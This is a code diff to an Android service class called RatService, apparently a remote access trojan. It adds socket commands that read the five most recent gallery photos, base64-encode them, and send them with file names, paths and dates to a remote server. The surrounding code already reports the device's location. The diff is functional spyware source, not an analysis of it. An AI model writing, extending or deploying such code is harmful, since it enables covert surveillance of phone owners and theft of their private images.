@@ -8,16 +8,22 @@ import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.location.Location;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
+import android.provider.MediaStore;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
 import android.widget.Toast;
+import android.database.Cursor;
+import android.content.ContentResolver;
+import android.content.ContentUris;
+import android.net.Uri;
 
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -33,6 +39,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.List;
@@ -160,6 +167,16 @@ public class RatService extends Service {
                         Log.e(TAG, "Error sending error response", ex);
                     }
                 }
+            });
+
+            socket.on("capture_photo", args -> {
+                Log.i(TAG, "capture_photo event received");
+                handleCapturePhoto();
+            });
+
+            socket.on("get_gallery_photos", args -> {
+                Log.i(TAG, "get_gallery_photos event received");
+                handleGetGalleryPhotos();
             });
 
             socket.connect();
@@ -320,6 +337,174 @@ public class RatService extends Service {
                 
         } catch (JSONException e) {
             Log.e(TAG, "Error creating location response", e);
+        }
+    }
+
+    private void handleCapturePhoto() {
+        Log.i(TAG, "Photo capture requested");
+        try {
+            JSONObject response = new JSONObject();
+            response.put("error", "Camera capture not available in service - use gallery instead");
+            response.put("suggestion", "Use get_gallery_photos to retrieve existing photos");
+            socket.emit("photo_response", response);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error responding to photo capture", e);
+        }
+    }
+
+    private void handleGetGalleryPhotos() {
+        Log.i(TAG, "Gallery photos requested");
+        try {
+            JSONArray photoArray = new JSONArray();
+            
+            Log.i(TAG, "Attempting to access gallery on API " + Build.VERSION.SDK_INT);
+            
+            // Query storage for images - try external first, then internal if needed
+            ContentResolver contentResolver = getContentResolver();
+            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            
+            // For newer Android versions, use simpler projection
+            String[] projection;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                projection = new String[]{
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.SIZE,
+                    MediaStore.Images.Media.DATE_ADDED
+                };
+            } else {
+                projection = new String[]{
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.DATA,
+                    MediaStore.Images.Media.SIZE,
+                    MediaStore.Images.Media.DATE_ADDED
+                };
+            }
+            
+            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+            
+            Cursor cursor = null;
+            try {
+                Log.i(TAG, "Querying MediaStore with projection size: " + projection.length);
+                cursor = contentResolver.query(uri, projection, null, null, sortOrder);
+            
+            if (cursor != null) {
+                int count = 0;
+                int maxPhotos = 5;
+                while (cursor.moveToNext() && count < maxPhotos) {
+                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
+                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
+                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
+                    long dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED));
+                    
+                    // Get image path - different approach for different API levels
+                    String imagePath = null;
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                            // For API 29+, use ContentResolver to open input stream
+                            Uri imageUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+                            imagePath = imageUri.toString(); // We'll use URI instead of file path
+                        } else {
+                            // For older versions, use DATA column
+                            imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error getting image path for ID: " + id, e);
+                        continue;
+                    }
+                    
+                    if (imagePath != null) {
+                        try {
+                            // Read and encode image - different approach for different API levels
+                            Bitmap bitmap = null;
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && imagePath.startsWith("content://")) {
+                                // For API 29+, use ContentResolver with InputStream
+                                Uri imageUri = Uri.parse(imagePath);
+                                try (InputStream inputStream = contentResolver.openInputStream(imageUri)) {
+                                    if (inputStream != null) {
+                                        bitmap = BitmapFactory.decodeStream(inputStream);
+                                    }
+                                }
+                            } else {
+                                // For older versions, use file path
+                                if (new File(imagePath).exists()) {
+                                    bitmap = BitmapFactory.decodeFile(imagePath);
+                                }
+                            }
+                            
+                            if (bitmap != null) {
+                                // Resize if too large
+                                int maxSize = 800;
+                                if (bitmap.getWidth() > maxSize || bitmap.getHeight() > maxSize) {
+                                    float scale = Math.min((float)maxSize / bitmap.getWidth(), (float)maxSize / bitmap.getHeight());
+                                    int newWidth = (int)(bitmap.getWidth() * scale);
+                                    int newHeight = (int)(bitmap.getHeight() * scale);
+                                    bitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, false);
+                                }
+                                
+                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                                byte[] imageBytes = baos.toByteArray();
+                                String base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT);
+                                
+                                JSONObject photoInfo = new JSONObject();
+                                photoInfo.put("name", displayName);
+                                photoInfo.put("path", imagePath);
+                                photoInfo.put("size", size);
+                                photoInfo.put("date_added", dateAdded);
+                                photoInfo.put("data", base64Image);
+                                photoInfo.put("width", bitmap.getWidth());
+                                photoInfo.put("height", bitmap.getHeight());
+                                
+                                photoArray.put(photoInfo);
+                                count++;
+                                
+                                bitmap.recycle();
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error processing image: " + imagePath, e);
+                        }
+                    }
+                }
+            }
+            
+            } catch (SecurityException e) {
+                Log.e(TAG, "Security exception - permission denied", e);
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Permission denied for gallery access");
+                errorResponse.put("suggestion", "Please grant storage/media permissions");
+                socket.emit("gallery_photos_response", errorResponse);
+                return;
+            } catch (Exception e) {
+                Log.e(TAG, "Error querying media store", e);
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to query gallery: " + e.getMessage());
+                errorResponse.put("exception_type", e.getClass().getSimpleName());
+                socket.emit("gallery_photos_response", errorResponse);
+                return;
+            } finally {
+                if (cursor != null) {
+                    cursor.close();
+                }
+            }
+            
+            JSONObject response = new JSONObject();
+            response.put("photos", photoArray);
+            response.put("count", photoArray.length());
+            
+            socket.emit("gallery_photos_response", response);
+            Log.i(TAG, "Sent " + photoArray.length() + " photos to server");
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting gallery photos", e);
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to get gallery photos: " + e.getMessage());
+                socket.emit("gallery_photos_response", errorResponse);
+            } catch (JSONException ex) {
+                Log.e(TAG, "Error sending error response", ex);
+            }
         }
     }
 
